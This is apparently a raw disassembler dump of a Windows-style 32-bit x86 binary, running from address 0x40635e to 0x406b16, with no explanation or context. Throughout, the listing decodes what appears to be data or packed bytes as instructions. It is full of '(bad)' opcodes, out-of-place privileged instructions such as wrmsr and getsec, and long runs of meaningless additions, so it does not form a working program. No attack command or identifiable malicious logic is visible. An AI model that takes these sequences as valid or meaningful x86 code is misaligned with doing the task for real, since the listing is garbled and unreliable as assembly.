  40635e:	and    BYTE PTR [edx-0x6adff226],bl
  406364:	fisttp DWORD PTR ds:0xddc5521
  40636a:	adc    edx,DWORD PTR [edx+0x2]
  40636d:	pop    ebp
  40636e:	push   cs
  40636f:	mov    ah,BYTE PTR [edi]
  406371:	push   esp
  406372:	push   cs
  406373:	or     ch,BYTE PTR [eax]
  406375:	pop    edi
  406376:	push   cs
  406377:	and    BYTE PTR [eax],ch
  406379:	push   esi
  40637a:	push   cs
  40637b:	aaa    
  40637c:	sub    BYTE PTR [ecx+0xe],al
  40637f:	xor    eax,0x6b0e4028
  406384:	sub    BYTE PTR [ebx],dh
  406386:	push   cs
  406387:	mov    BYTE PTR [ecx],ah
  406389:	xor    cl,BYTE PTR [esi]
  40638b:	and    BYTE PTR [ebx],0x25
  40638e:	push   cs
  40638f:	popf   
  406390:	and    bl,BYTE PTR [esi+ecx*1]
  406393:	jg     0x4063b7
  406395:	pop    ss
  406396:	push   cs
  406397:	jae    0x4063bb
  406399:	dec    edx
  40639a:	or     eax,0xd4f0289
  40639f:	add    DWORD PTR [edx],0x51
  4063a2:	or     eax,0xd40208d
  4063a7:	pop    edx
  4063a8:	and    BYTE PTR [ecx],ch
  4063aa:	or     eax,0x0
  4063af:	add    dl,bl
  4063b1:	add    ch,BYTE PTR [ebx-0x55df27f4]
  4063b7:	or     al,0x4c
  4063b9:	and    BYTE PTR [ebp-0x58de80f4],ch
  4063bf:	or     al,0xaa
  4063c1:	add    dh,BYTE PTR [ebx-0x52dfa2f4]
  4063c7:	or     al,0xe0
  4063c9:	and    DWORD PTR [edi-0x61dee6f4],esp
  4063cf:	or     al,0xbe
  4063d1:	daa    
  4063d2:	mov    edx,0xb7216d0c
  4063d7:	or     al,0x8f
  4063d9:	and    BYTE PTR [ecx-0x4cdf09f4],dh
  4063df:	or     al,0xf7
  4063e1:	and    BYTE PTR [ebp+0x7d21170c],ah
  4063e7:	or     al,0x16
  4063e9:	and    DWORD PTR [eax],eax
  4063eb:	xchg   esi,eax
  4063ec:	xor    ch,0x1f
  4063ef:	mov    DWORD PTR [edx+0x32],edi
  4063f2:	add    eax,0x5337248
  4063f7:	dec    ebx
  4063f8:	push   0x30
  4063fa:	add    eax,0x531824a
  4063ff:	inc    ebp
  406400:	jp     0x406438
  406402:	add    eax,0x537724c
  406407:	inc    edi
  406408:	push   0x34
  40640a:	add    eax,0x535824e
  40640f:	inc    ecx
  406410:	jp     0x40644c
  406412:	add    eax,0x10
  406417:	add    BYTE PTR [eax],al
  406419:	jb     0x406456
  40641b:	add    eax,0x5386a13
  406420:	add    al,BYTE PTR [edx+0x7bfd0539]
  406426:	ds add eax,0x53f7214
  40642c:	punpckhdq mm7,QWORD PTR [eax*1+0x53d8206]
  406434:	stc    
  406435:	jnp    0x406499
  406437:	add    eax,0x56385d8
  40643c:	fild   DWORD PTR [ebp+0x65da0560]
  406442:	popa   
  406443:	add    eax,0x56665d5
  406448:	mov    esp,0xb7056765
  40644d:	gs fs add eax,0x56585be
  406454:	mov    cl,0x85
  406456:	push   0x5
  406458:	mov    al,ds:0xa3056b85
  40645d:	test   DWORD PTR [eax+0x5],ebp
  406460:	dec    eax
  406461:	add    ecx,DWORD PTR fs:[esi]
  406464:	dec    ebx
  406465:	add    BYTE PTR fs:[esi],cl
  406468:	add    BYTE PTR [edi],ch
  40646a:	repz add cl,BYTE PTR [esi]
  40646d:	xor    bl,dh
  40646f:	add    ecx,DWORD PTR [esi]
  406471:	inc    ecx
  406472:	repz add al,0xe
  406475:	xor    dh,bl
  406477:	add    eax,0x6f2f30e
  40647c:	push   cs
  40647d:	add    BYTE PTR [eax],al
  40647f:	add    BYTE PTR [eax],al
  406481:	add    BYTE PTR [ebx+esi*8],al
  406484:	pop    es
  406485:	push   cs
  406486:	cmc    
  406487:	repnz or BYTE PTR [esi],cl
  40648a:	div    dl
  40648c:	or     DWORD PTR [esi],ecx
  40648e:	out    0xf2,eax
  406490:	or     cl,BYTE PTR [esi]
  406492:	call   0xf94e7089
  406497:	icebp  
  406498:	or     al,0xe
  40649a:	jmp    0xef1:0xcb0e0df1
  4064a1:	push   cs
  4064a2:	mov    esp,0xad0e0ff1
  4064a7:	icebp  
  4064a8:	adc    BYTE PTR [esi],cl
  4064aa:	scas   al,BYTE PTR es:[edi]
  4064ab:	icebp  
  4064ac:	adc    DWORD PTR [esi],ecx
  4064ae:	jg     0x4064a1
  4064b0:	adc    cl,BYTE PTR [esi]
  4064b2:	xor    cl,0x13
  4064b5:	push   cs
  4064b6:	jno    0x4064a9
  4064b8:	adc    al,0xe
  4064ba:	(bad)
  4064bf:	repz push ss
  4064c1:	push   cs
  4064c2:	aam    0xf2
  4064c4:	pop    ss
  4064c5:	push   cs
  4064c6:	in     eax,0xf2
  4064c8:	sbb    BYTE PTR [esi],cl
  4064ca:	out    0xf2,al
  4064cc:	sbb    DWORD PTR [esi],ecx
  4064ce:	div    edx
  4064d0:	sbb    cl,BYTE PTR [esi]
  4064d2:	js     0x4064c6
  4064d4:	sbb    ecx,DWORD PTR [esi]
  4064d6:	imul   esi,edx,0xf25a0e1c
  4064dc:	sbb    eax,0x1ef25b0e
  4064e1:	push   cs
  4064e2:	or     al,0xf3
  4064e4:	pop    ds
  4064e5:	push   cs
  4064e6:	add    BYTE PTR [eax],al
  4064e8:	add    BYTE PTR [eax],al
  4064ea:	add    BYTE PTR [ebp-0x56],dh
  4064ed:	adc    BYTE PTR [ecx],ah
  4064ef:	jnp    0x406498
  4064f1:	adc    BYTE PTR [edx],ah
  4064f3:	jae    0x40649d
  4064f5:	adc    BYTE PTR [ebx],ah
  4064f7:	imul   esp,DWORD PTR [ebp-0x517cdbf0],0x10
  4064fe:	and    eax,0x2610a37b
  406503:	jae    0x406531
  406505:	adc    BYTE PTR [edi],ah
  406507:	imul   edx,DWORD PTR [ecx],0x10
  40650a:	sub    BYTE PTR [ebx+0x7b291022],al
  406510:	pop    ds
  406511:	adc    BYTE PTR [edx],ch
  406513:	jae    0x406525
  406515:	adc    BYTE PTR [ebx],ch
  406517:	imul   ebp,DWORD PTR ds:0x26832c10,0x10
  40651e:	sub    eax,0x2e0ffb7b
  406523:	jae    0x406539
  406525:	adc    BYTE PTR [edi],ch
  406527:	imul   ebx,DWORD PTR [ecx],0x10
  40652a:	xor    BYTE PTR [ebx+0x7b31101a],al
  406530:	pop    ss
  406531:	adc    BYTE PTR [edx],dh
  406533:	jae    0x40652d
  406535:	rdpmc  
  406537:	imul   esi,ebp,0xf
  40653a:	xor    al,0x83
  40653c:	dec    BYTE PTR [edi]
  40653e:	xor    eax,0x360ff37b
  406543:	jae    0x4064e1
  406545:	getsec 
  406547:	imul   eax,DWORD PTR [ecx+0xf],0x38
  40654b:	adc    DWORD PTR [edx+0x390f],0x0
  406552:	add    BYTE PTR [eax],al
  406554:	jnp    0x4064e5
  406556:	(bad)  
  406559:	mov    ds:0x7c6b3e0f,eax
  40655e:	(bad)  
  406560:	or     DWORD PTR [ecx+0xf],0x40
  406564:	jnp    0x4065b0
  406566:	cmovno esi,DWORD PTR [ebx+0x2]
  40656a:	mov    ecx,DWORD PTR [edi]
  40656c:	aaa    
  40656d:	or     al,0x8a
  40656f:	(bad)  
  406571:	or     al,0x8d
  406573:	rdtsc  
  406575:	or     al,0x84
  406577:	(bad)  
  40657a:	(bad)  
  40657b:	rdpmc  
  40657d:	or     al,0x86
  40657f:	(bad)  
  406582:	or     DWORD PTR [edi],0xf800c3d
  406588:	sub    al,0xc
  40658a:	push   ebx
  40658b:	comiss xmm1,DWORD PTR [edx+edx*2]
  40658f:	(bad)  
  406591:	or     al,0x45
  406593:	(bad)  
  406595:	or     al,0x3c
  406597:	wrmsr  
  406599:	or     al,0x39
  40659b:	(bad)  
  40659d:	or     al,0x38
  40659f:	pinsrw mm1,WORD PTR [eax],0x3b
  4065a3:	cmpxchg8b QWORD PTR [eax]
  4065a6:	cmp    cl,BYTE PTR [edi]
  4065a8:	(bad)  
  4065a9:	or     BYTE PTR ds:0x1408c10f,bl
  4065af:	push   gs
  4065b1:	or     BYTE PTR [edi],bl
  4065b3:	bt     DWORD PTR [eax],ecx
  4065b6:	push   ss
  4065b7:	sldt   WORD PTR [eax]
  4065ba:	add    BYTE PTR [eax],al
  4065bc:	add    BYTE PTR [edx-0x62f0fef8],ch
  4065c2:	or     BYTE PTR [eax],al
  4065c4:	bswap  esp
  4065c6:	or     BYTE PTR [eax+0xe],cl
  4065c9:	adc    ecx,DWORD PTR fs:[ebx+0xe]
  4065cd:	adc    ecx,DWORD PTR [bp+si+0x660d]
  4065d2:	adc    eax,DWORD PTR [ebp-0x73ecb6f3]
  4065d8:	or     eax,0xd871340
  4065dd:	dec    ebx
  4065de:	adc    ecx,DWORD PTR [esi-0x6eecbdf3]
  4065e4:	or     eax,0x800013ad
  4065e9:	js     0x406606
  4065eb:	xor    DWORD PTR [ebx+0x52311c70],eax
  4065f1:	push   0x804d311d
  4065f6:	push   ss
  4065f7:	xor    DWORD PTR [eax+edi*2+0x17],eax
  4065fb:	xor    DWORD PTR [edi],edi
  4065fd:	jo     0x406617
  4065ff:	xor    DWORD PTR [esi+0x68],edx
  406602:	sbb    DWORD PTR [ecx],esi
  406604:	cmp    DWORD PTR [eax+0x783830c2],eax
  40660a:	ret    
  40660b:	xor    BYTE PTR [ebx],bh
  40660d:	jo     0x4065d3
  40660f:	xor    BYTE PTR [edx-0x6acf3a98],bl
  406615:	cmp    BYTE PTR [esi-0x408763d0],0x30
  40661c:	xchg   edi,eax
  40661d:	jo     0x4065df
  40661f:	xor    BYTE PTR [esi+0x0],bh
  406622:	add    BYTE PTR [eax],al
  406624:	add    BYTE PTR [eax],al
  406626:	push   0x808130c1
  40662b:	retf   0x7030
  40662e:	js     0x4065fb
  406630:	xor    BYTE PTR [ebx+0x70],dh
  406633:	int3   
  406634:	xor    BYTE PTR [edx+0x68],ah
  406637:	int    0x30
  406639:	pop    ebp
  40663a:	add    dh,0x30
  40663d:	push   esp
  40663e:	js     0x406607
  406640:	xor    BYTE PTR [edi+0x70],cl
  406643:	enter  0x4630,0x68
  406647:	leave  
  406648:	xor    BYTE PTR [ecx],ch
  40664a:	xor    BYTE PTR [edx-0x4c87d7d0],0x30
  406651:	sub    esi,DWORD PTR [eax-0x4c]
  406654:	xor    BYTE PTR [edx-0x5acf4a91],ch
  40665a:	jg     0x40660a
  40665c:	xor    BYTE PTR [edi+edi*2+0x6fa730af],ch
  406663:	mov    al,0x30
  406665:	add    bl,cl
  406667:	or     edx,DWORD PTR [edi+0x31]
  40666a:	and    al,0xc
  40666c:	pop    eax
  40666d:	xor    DWORD PTR ds:0x1631590c,edx
  406673:	or     al,0x5a
  406675:	xor    DWORD PTR [edi],esp
  406677:	or     al,0x5b
  406679:	xor    DWORD PTR [eax],esp
  40667b:	or     al,0x5c
  40667d:	xor    DWORD PTR [ecx],edx
  40667f:	or     al,0x5d
  406681:	xor    edx,esp
  406683:	or     ebx,DWORD PTR [esi+0x31]
  406686:	add    ecx,DWORD PTR [edi+ebx*2]
  406689:	xor    DWORD PTR [eax],eax
  40668b:	add    BYTE PTR [eax],al
  40668d:	add    BYTE PTR [eax],al
  40668f:	or     al,0xc
  406691:	pusha  
  406692:	xor    DWORD PTR ds:0xfe31610c,ecx
  406698:	or     esp,DWORD PTR [edx+0x31]
  40669b:	pop    edi
  40669c:	or     al,0x63
  40669e:	xor    DWORD PTR [eax+0xc],ecx
  4066a1:	test   al,0x11
  4066a3:	dec    ecx
  4066a4:	or     al,0xa9
  4066a6:	adc    DWORD PTR [edx+0xc],ecx
  4066a9:	stos   BYTE PTR es:[edi],al
  4066aa:	adc    DWORD PTR [ebx+0xc],ebx
  4066ad:	stos   DWORD PTR es:[edi],eax
  4066ae:	adc    DWORD PTR [esp+ecx*1+0xc8511ac],edx
  4066b5:	lods   eax,DWORD PTR ds:[esi]
  4066b6:	adc    DWORD PTR [esi-0x48ee51f4],eax
  4066bc:	or     al,0xaf
  4066be:	adc    DWORD PTR [eax-0x7eee4ff4],edx
  4066c4:	or     al,0xb1
  4066c6:	adc    DWORD PTR [edx-0x6cee4df4],edx
  4066cc:	or     al,0xb3
  4066ce:	adc    DWORD PTR [esp+ecx*1-0x4c],edi
  4066d2:	adc    DWORD PTR [ebp+0xc],edi
  4066d5:	mov    ch,0x11
  4066d7:	outs   dx,BYTE PTR ds:[esi]
  4066d8:	or     al,0xb6
  4066da:	adc    DWORD PTR [edi],ebp
  4066dc:	or     dh,BYTE PTR [edi-0x47f5c7ef]
  4066e2:	adc    DWORD PTR [ebp+0x46],esi
  4066e5:	or     DWORD PTR [ecx-0x45f6c09c],edi
  4066eb:	fs dec eax
  4066ed:	or     DWORD PTR [ebx-0x43f6ce7c],edi
  4066f3:	add    BYTE PTR [eax],al
  4066f5:	add    BYTE PTR [eax],al
  4066f7:	add    BYTE PTR [edx+eax*2+0x4384bd09],al
  4066fe:	or     DWORD PTR [esi-0x40f68b7c],edi
  406704:	test   DWORD PTR fs:[ecx],ecx
  406707:	shl    BYTE PTR [esi+edi*2+0x9],0xc1
  40670c:	xlat   BYTE PTR fs:[ebx]
  40670e:	or     dl,al
  406710:	fs jo  0x40671c
  406713:	ins    DWORD PTR es:[edi],dx
  406714:	(bad)  fs:[eax]
  406717:	jno    0x40677d
  406719:	fimul  DWORD PTR [eax]
  40671b:	js     0x406781
  40671d:	fisttp DWORD PTR [eax]
  40671f:	jg     0x406785
  406721:	mov    esp,0xad448108
  406726:	or     BYTE PTR [esp+eax*2+0x448608b6],al
  40672d:	scas   eax,DWORD PTR es:[edi]
  40672e:	or     BYTE PTR [ebp-0x71f6e7bc],cl
  406734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406735:	ror    DWORD PTR [eax],0xeb
  406738:	test   BYTE PTR [edx],dl
  40673a:	or     eax,esi
  40673c:	test   BYTE PTR [ebx],dl
  40673e:	or     ecx,edi
  406740:	test   BYTE PTR [eax],ah
  406742:	or     DWORD PTR [ecx-0x540a426b],ebp
  406748:	xchg   ebp,eax
  406749:	lods   eax,DWORD PTR ds:[esi]
  40674a:	cmc    
  40674b:	push   ecx
  40674c:	je     0x406714
  40674e:	cmc    
  40674f:	push   edx
  406750:	je     0x406711
  406752:	cmc    
  406753:	ja     0x4067c9
  406755:	leave  
  406756:	and    ah,BYTE PTR [eax-0x5edd35ab]
  40675c:	add    BYTE PTR [eax],al
  40675e:	add    BYTE PTR [eax],al
  406760:	add    BYTE PTR [ebp-0x35],dl
  406763:	and    ah,BYTE PTR [edx+0x248a0255]
  406769:	(bad)  
  40676a:	and    DWORD PTR [ebp-0x73de2edc],eax
  406770:	and    al,0xd8
  406772:	and    DWORD PTR [edi-0x71de2cdc],eax
  406778:	and    al,0x1a
  40677a:	and    dl,BYTE PTR [ecx-0x7fdde2dc]
  406780:	and    al,0xc
  406782:	and    al,BYTE PTR [ebx+0x52220f24]
  406788:	and    al,0x1e
  40678a:	and    cl,BYTE PTR [ebp+0x24]
  40678d:	sbb    DWORD PTR [edx],esp
  40678f:	loope  0x4067e9
  406791:	jne    0x406795
  406793:	loope  0x406798
  406795:	jne    0x406799
  406797:	lock pop eax
  406799:	jne    0x40679d
  40679b:	lock add esi,DWORD PTR [ebp+0x2]
  40679f:	loop   0x4067f9
  4067a1:	jne    0x4067a5
  4067a3:	fld    QWORD PTR [ebx]
  4067a5:	jne    0x4067a9
  4067a7:	hlt    
  4067a8:	pop    eax
  4067a9:	jne    0x4067ad
  4067ab:	in     al,dx
  4067ac:	add    esi,DWORD PTR [ebp+0x2]
  4067af:	cli    
  4067b0:	pop    eax
  4067b1:	jne    0x4067b5
  4067b3:	cli    
  4067b4:	add    esi,DWORD PTR [ebp+0x2]
  4067b7:	loop   0x406811
  4067b9:	jne    0x4067bd
  4067bb:	loop   0x4067c0
  4067bd:	jne    0x4067c1
  4067bf:	ss pop ecx
  4067c1:	jne    0x4067c5
  4067c3:	inc    DWORD PTR [edx]
  4067c5:	add    BYTE PTR [eax],al
  4067c7:	add    BYTE PTR [eax],al
  4067c9:	add    BYTE PTR [ebp+0x2],dh
  4067cc:	mov    ecx,0xc5027558
  4067d1:	add    dh,BYTE PTR [ebp+0x2]
  4067d4:	mov    eax,0xc4027558
  4067d9:	add    dh,BYTE PTR [ebp+0x2]
  4067dc:	fwait
  4067dd:	pop    eax
  4067de:	jne    0x4067e2
  4067e0:	mov    DWORD PTR [edx],0x9a000275
  4067e6:	mov    ebp,0x77c60002
  4067eb:	add    al,BYTE PTR [eax]
  4067ed:	cmp    eax,0x110002ac
  4067f2:	jbe    0x4067f6
  4067f4:	add    BYTE PTR [esp+ebx*4],bh
  4067f7:	add    al,BYTE PTR [eax]
  4067f9:	or     BYTE PTR [esi+0x2],dh
  4067fc:	add    BYTE PTR [edi],bl
  4067fe:	dec    esp
  4067ff:	add    al,BYTE PTR [eax]
  406801:	or     esi,DWORD PTR [esi+0x2]
  406804:	add    BYTE PTR [esi],bl
  406806:	cmp    al,0x2
  406808:	add    BYTE PTR [edx],cl
  40680a:	jbe    0x40680e
  40680c:	add    BYTE PTR [ecx],cl
  40680e:	sub    al,0x2
  406810:	add    al,dl
  406812:	jbe    0x406816
  406814:	add    BYTE PTR [eax],cl
  406816:	sbb    al,0x2
  406818:	add    BYTE PTR [ebp+0xb000276],bh
  40681e:	dec    esp
  40681f:	add    al,BYTE PTR [eax]
  406821:	shl    BYTE PTR [esi+0x2],cl
  406824:	add    BYTE PTR [edx],cl
  406826:	cmp    al,0x2
  406828:	add    BYTE PTR [edi+esi*2+0xd30002],bh
  40682f:	add    BYTE PTR [eax],al
  406831:	add    BYTE PTR [eax],al
  406833:	sub    eax,0x710e0002
  406838:	add    al,BYTE PTR [eax]
  40683a:	ret    0x21d
  40683d:	add    dl,ch
  40683f:	ja     0x406843
  406841:	add    BYTE PTR [ecx-0x33],ch
  406844:	add    al,BYTE PTR [eax]
  406846:	or     DWORD PTR [ecx+0x2],esi
  406849:	add    BYTE PTR [eax-0x43],ah
  40684c:	add    al,BYTE PTR [eax]
  40684e:	loopne 0x4068c6
  406850:	add    al,BYTE PTR [eax]
  406852:	je     0x406801
  406854:	add    al,BYTE PTR [eax]
  406856:	in     al,dx
  406857:	ja     0x40685b
  406859:	add    BYTE PTR [eax-0x63],bh
  40685c:	add    al,BYTE PTR [eax]
  40685e:	cdq    
  40685f:	jbe    0x406863
  406861:	add    BYTE PTR [eax],al
  406863:	into   
  406864:	mov    edx,0x1adffff
  406869:	add    BYTE PTR [eax],al
  40686b:	mov    edi,0x9effffba
  406870:	add    DWORD PTR [eax],eax
  406872:	add    BYTE PTR [eax-0x50000053],dl
  406878:	(bad)  
  406879:	(bad)  
  40687a:	inc    DWORD PTR [ecx+0x70ffffad]
  406880:	(bad)  
  406881:	(bad)  
  406882:	call   DWORD PTR [edx-0x53]
  406885:	(bad)  
  406886:	push   DWORD PTR [ecx-0x2]
  406889:	(bad)  
  40688a:	inc    DWORD PTR [ebx-0x53]
  40688d:	(bad)  
  40688e:	push   DWORD PTR [edx-0x2]
  406891:	(bad)  
  406892:	push   esp
  406894:	lods   al,BYTE PTR ds:[esi]
  406895:	(bad)  
  406896:	inc    DWORD PTR [eax]
  406898:	add    BYTE PTR [eax],al
  40689a:	add    BYTE PTR [eax],al
  40689c:	mov    bl,0x0
  40689e:	add    BYTE PTR [eax],al
  4068a0:	inc    ebp
  4068a1:	lods   eax,DWORD PTR ds:[esi]
  4068a2:	(bad)  
  4068a3:	push   DWORD PTR [eax+eax*1-0x52e80000]
  4068aa:	(bad)  
  4068ab:	(bad)  
  4068ac:	mov    edi,0x46000000
  4068b1:	lods   eax,DWORD PTR ds:[esi]
  4068b2:	(bad)  
  4068b3:	jmp    FWORD PTR [ebp-0x9000000]
  4068b9:	lods   al,BYTE PTR ds:[esi]
  4068ba:	(bad)  
  4068bb:	(bad)  
  4068bc:	jle    0x4068bc
  4068be:	(bad)  
  4068bf:	dec    DWORD PTR [ecx]
  4068c1:	lods   eax,DWORD PTR ds:[esi]
  4068c2:	(bad)  
  4068c3:	call   FWORD PTR [eax-0x26000000]
  4068c9:	stos   DWORD PTR es:[edi],eax
  4068ca:	(bad)  
  4068cb:	(bad)  
  4068cc:	jns    0x4068cc
  4068ce:	(bad)  
  4068cf:	dec    ebx
  4068d1:	stos   DWORD PTR es:[edi],eax
  4068d2:	(bad)  
  4068d3:	call   FWORD PTR [edx+0x0]
  4068d6:	add    BYTE PTR [eax],al
  4068d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068d9:	stos   DWORD PTR es:[edi],eax
  4068da:	(bad)  
  4068db:	jmp    esi
  4068dd:	(bad)  
  4068de:	(bad)  
  4068df:	push   DWORD PTR [ebp-0x40]
  4068e2:	push   esi
  4068e3:	add    BYTE PTR [ebp-0x80],dh
  4068e6:	add    eax,DWORD PTR [eax]
  4068e8:	jne    0x406897
  4068ea:	push   esi
  4068eb:	add    BYTE PTR [ebp-0x7b],dh
  4068ee:	add    eax,DWORD PTR [eax]
  4068f0:	jne    0x4068b0
  4068f2:	push   esi
  4068f3:	add    BYTE PTR [ebp-0x2a],dh
  4068f6:	add    al,BYTE PTR [eax]
  4068f8:	jne    0x406965
  4068fa:	push   esi
  4068fb:	add    BYTE PTR [ebp-0x3d],dh
  4068fe:	add    eax,DWORD PTR [eax]
  406900:	add    BYTE PTR [eax],al
  406902:	add    BYTE PTR [eax],al
  406904:	add    BYTE PTR [ebp+0x7c],dh
  406907:	push   esi
  406908:	add    BYTE PTR [ebp+0x14],dh
  40690b:	add    eax,0x55d97500
  406910:	add    BYTE PTR [ebp-0x37],dh
  406913:	add    eax,DWORD PTR [eax]
  406915:	jne    0x4068f1
  406917:	push   ebp
  406918:	add    BYTE PTR [ebp-0x36],dh
  40691b:	add    eax,DWORD PTR [eax]
  40691d:	jne    0x4068d6
  40691f:	push   ebp
  406920:	add    BYTE PTR [ebp+0x7],dh
  406923:	add    al,0x0
  406925:	jne    0x4068df
  406927:	push   ebp
  406928:	add    BYTE PTR [ebp+0x8],dh
  40692b:	add    al,0x0
  40692d:	jne    0x406944
  40692f:	push   esi
  406930:	add    BYTE PTR [ebp-0x3],dh
  406933:	add    eax,DWORD PTR [eax]
  406935:	jne    0x40694d
  406937:	push   esi
  406938:	add    BYTE PTR [ebp-0x2],dh
  40693b:	add    eax,DWORD PTR [eax]
  40693d:	jne    0x4069b2
  40693f:	push   esi
  406940:	add    BYTE PTR [ebp+0x3b],dh
  406943:	add    eax,DWORD PTR [eax]
  406945:	jne    0x4069bb
  406947:	push   esi
  406948:	add    BYTE PTR [ebp+0x3c],dh
  40694b:	add    eax,DWORD PTR [eax]
  40694d:	jne    0x4068d0
  40694f:	push   esi
  406950:	add    BYTE PTR [ebp+0x31],dh
  406953:	add    eax,DWORD PTR [eax]
  406955:	jne    0x406929
  406957:	push   ebp
  406958:	add    BYTE PTR [ebp+0x42],dh
  40695b:	add    eax,DWORD PTR [eax]
  40695d:	jne    0x406961
  40695f:	addr16 push esi
  406961:	jne    0x406965
  406963:	cdq    
  406964:	add    esi,DWORD PTR [ebp+0x2]
  406967:	push   esi
  406968:	push   esi
  406969:	add    BYTE PTR [eax],al
  40696b:	add    BYTE PTR [eax],al
  40696d:	add    BYTE PTR [ebp+0x2],dh
  406970:	cwde   
  406971:	add    esi,DWORD PTR [ebp+0x2]
  406974:	sub    DWORD PTR [esi+0x75],edx
  406977:	add    bh,BYTE PTR [ebx+0x3]
  40697a:	jne    0x40697e
  40697c:	sub    BYTE PTR [esi+0x75],dl
  40697f:	add    bh,BYTE PTR [edx+0x3]
  406982:	jne    0x406986
  406984:	stos   DWORD PTR es:[edi],eax
  406985:	push   ebp
  406986:	jne    0x40698a
  406988:	push   ebp
  406989:	add    al,0x75
  40698b:	add    ch,BYTE PTR [edx+0x54027555]
  406991:	add    al,0x75
  406993:	add    ch,BYTE PTR [ebp+0x37027555]
  406999:	add    al,0x75
  40699b:	add    ch,BYTE PTR [ebp+edx*2+0x4360275]
  4069a2:	jne    0x4069a6
  4069a4:	scas   eax,DWORD PTR es:[edi]
  4069a5:	push   ebp
  4069a6:	jne    0x4069aa
  4069a8:	and    DWORD PTR [esi*2+0x7555ae02],eax
  4069af:	add    dl,BYTE PTR [eax]
  4069b1:	add    al,0x75
  4069b3:	add    dh,BYTE PTR [ecx+0x3027555]
  4069b9:	add    al,0x75
  4069bb:	add    ah,BYTE PTR [eax-0xdfd8aab]
  4069c1:	add    esi,DWORD PTR [ebp+0x2]
  4069c4:	xor    edx,DWORD PTR [ebp+0x75]
  4069c7:	add    bl,ch
  4069c9:	add    esi,DWORD PTR [ebp+0x2]
  4069cc:	and    dl,BYTE PTR [ebp+0x75]
  4069cf:	add    cl,ah
  4069d1:	add    eax,DWORD PTR [eax]
  4069d3:	add    BYTE PTR [eax],al
  4069d5:	add    BYTE PTR [eax],al
  4069d7:	jne    0x4069db
  4069d9:	xor    eax,0xbf027555
  4069de:	add    esi,DWORD PTR [ebp+0x2]
  4069e1:	add    BYTE PTR [eax+eax*8],ah
  4069e4:	add    al,BYTE PTR [eax]
  4069e6:	scas   al,BYTE PTR es:[edi]
  4069e7:	jbe    0x4069eb
  4069e9:	add    BYTE PTR [edi],dh
  4069eb:	mov    al,ds:0x79690002
  4069f0:	add    al,BYTE PTR [eax]
  4069f2:	mov    al,es:0x79680002
  4069f8:	add    al,BYTE PTR [eax]
  4069fa:	sbb    eax,eax
  4069fc:	add    al,BYTE PTR [eax]
  4069fe:	imul   edi,DWORD PTR [ecx+0x2],0x0
  406a02:	sbb    al,al
  406a04:	add    al,BYTE PTR [eax]
  406a06:	push   0x79
  406a08:	add    al,BYTE PTR [eax]
  406a0a:	mov    ebx,0x650002a1
  406a0f:	jbe    0x406a13
  406a11:	add    BYTE PTR [edx+0x640002a1],bh
  406a17:	jbe    0x406a1b
  406a19:	add    BYTE PTR [ebp+0x67000241],bl
  406a1f:	jbe    0x406a23
  406a21:	add    BYTE PTR [ecx+eax*2+0x76660002],bl
  406a28:	add    al,BYTE PTR [eax]
  406a2a:	mov    BYTE PTR [ecx],ah
  406a2c:	add    al,BYTE PTR [eax]
  406a2e:	dec    ecx
  406a2f:	jbe    0x406a33
  406a31:	add    BYTE PTR [ebx+0x48000221],cl
  406a37:	jbe    0x406a3b
  406a39:	add    BYTE PTR [edx+0x0],cl
  406a3f:	add    BYTE PTR [ecx+0x2],al
  406a42:	add    BYTE PTR [ebx+0x76],cl
  406a45:	add    al,BYTE PTR [eax]
  406a47:	lea    eax,[ecx+0x2]
  406a4a:	add    BYTE PTR [edx+0x77],cl
  406a4d:	add    al,BYTE PTR [eax]
  406a4f:	push   eax
  406a50:	and    DWORD PTR [edx],eax
  406a52:	add    BYTE PTR [ebp+0x43000276],al
  406a58:	and    DWORD PTR [edx],eax
  406a5a:	add    BYTE PTR [edi+esi*2-0x38fffffe],al
  406a61:	mov    dh,0xff
  406a63:	call   DWORD PTR [edi]
  406a65:	add    eax,0xb6b00000
  406a6a:	(bad)  
  406a6b:	inc    DWORD PTR [eax]
  406a6d:	add    eax,0xb5fb0000
  406a72:	(bad)  
  406a73:	inc    DWORD PTR [ecx]
  406a75:	add    eax,0x4db0000
  406a7a:	cmp    eax,0x407bf800
  406a7f:	add    BYTE PTR [esi],ch
  406a81:	add    al,0x5
  406a83:	add    BYTE PTR [eax],al
  406a85:	jl     0x406ac7
  406a87:	add    BYTE PTR [ecx-0x2fffd0fb],cl
  406a8d:	jnp    0x406acf
  406a8f:	add    BYTE PTR [ebp+0x6],cl
  406a92:	add    eax,0x3fcf7800
  406a97:	add    BYTE PTR [edi-0x1ffffafa],ah
  406a9d:	int    0x3f
  406a9f:	add    BYTE PTR [edi],ah
  406aa1:	push   es
  406aa2:	push   cs
  406aa3:	add    BYTE PTR [eax],al
  406aa5:	add    BYTE PTR [eax],al
  406aa7:	add    BYTE PTR [eax],al
  406aa9:	ror    ch,1
  406aab:	aas    
  406aac:	add    BYTE PTR [edx],ah
  406aae:	push   es
  406aaf:	adc    al,0x0
  406ab1:	or     dh,cl
  406ab3:	aas    
  406ab4:	add    dl,bl
  406ab6:	add    al,0x9
  406ab8:	add    ah,ah
  406aba:	int    0x3f
  406abc:	add    BYTE PTR [esi-0x3fff9fc],ch
  406ac2:	int    0x3f
  406ac4:	add    BYTE PTR [ebp+0x6],al
  406ac7:	add    eax,0x3fcdd400
  406acc:	add    BYTE PTR [ebx],ah
  406ace:	push   es
  406acf:	add    eax,DWORD PTR [eax]
  406ad1:	call   0x8540aaa3
  406ad6:	add    al,0x13
  406ad8:	add    BYTE PTR [esi+ecx*8+0x3f],cl
  406adc:	add    BYTE PTR [ebp-0x53],dh
  406adf:	add    ecx,DWORD PTR [edx]
  406ae1:	jne    0x406b58
  406ae3:	jl     0x406b25
  406ae5:	jne    0x406ac4
  406ae7:	add    eax,DWORD PTR [esi]
  406ae9:	jne    0x406b68
  406aeb:	jl     0x406b2d
  406aed:	jne    0x406abb
  406aef:	add    eax,DWORD PTR [esi]
  406af1:	jne    0x406a78
  406af3:	jl     0x406b35
  406af5:	jne    0x406a7d
  406af7:	add    al,0x9
  406af9:	jne    0x406a7c
  406afb:	jl     0x406b3d
  406afd:	jne    0x406b44
  406aff:	add    eax,DWORD PTR [esi*2+0x75407bc9]
  406b06:	or     eax,DWORD PTR [eax+ecx*1]
  406b09:	jne    0x406af0
  406b0b:	jnp    0x406b4d
  406b0d:	add    BYTE PTR [eax],al
  406b0f:	add    BYTE PTR [eax],al
  406b11:	add    BYTE PTR [ebp-0x44],dh
  406b14:	add    ecx,DWORD PTR [esi]
  406b16:	jne    0x406aed
